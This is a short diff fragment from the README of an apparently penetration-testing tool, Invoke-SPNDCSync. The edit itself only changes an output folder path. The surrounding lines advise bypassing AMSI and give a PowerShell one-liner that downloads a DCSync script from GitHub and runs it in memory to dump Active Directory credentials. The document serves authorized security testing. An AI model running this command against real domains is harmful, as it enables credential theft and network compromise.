@@ -29,7 +29,7 @@ It is recommended to bypass AMSI for the current PowerShell session. Use a 0-Day
 
 Download ``Invoke-SPNDCSync.ps1`` into memory, which executes the DCSync process.
 
-As a result, we will obtain our files located under C:\temp\SPN-DCSYNC\ directory:
+As a result, we will obtain our files located under C:\temp\ directory:
 
 ````
 iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pentestfactory/Invoke-SPNDCSync/main/Invoke-SPNDCSync.ps1')
